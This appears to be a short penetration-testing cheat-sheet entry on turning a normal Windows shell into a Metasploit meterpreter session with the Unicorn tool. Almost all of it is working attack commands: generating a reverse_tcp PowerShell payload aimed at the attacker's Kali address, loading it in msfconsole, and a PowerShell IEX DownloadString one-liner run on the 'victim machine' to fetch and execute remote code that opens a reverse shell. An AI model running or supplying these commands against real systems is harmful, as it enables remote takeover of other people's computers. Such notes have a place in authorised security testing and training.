# Normal shell to meterpreter (Windows)

> Unicorn can create powershell scripts to load a reverse meterpreter from a normal shell:

```bash
#Use x64 if it's 64 bit architecture.
python unicorn.py windows/meterpreter/reverse_tcp $KALIIP $KALIPORT
#This will create 2 files (.rc and .txt)

#Load .rc at msfconsole:
msfconsole -r unicorn.rc

#Create a new file in Kali with the payload (which is inside the .txt file under double quotes, ignore the powershell ...) and serve is with python http server. Then, execute it in the victim machine through IEX:

powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('$URLOFFILE')

#or without .exe

powershell "IEX (New-Object System.Net.WebClient).DownloadString('$URLOFFILE')"

#Note that this isn't inmediate, it can be delayed by 20 seconds.
```
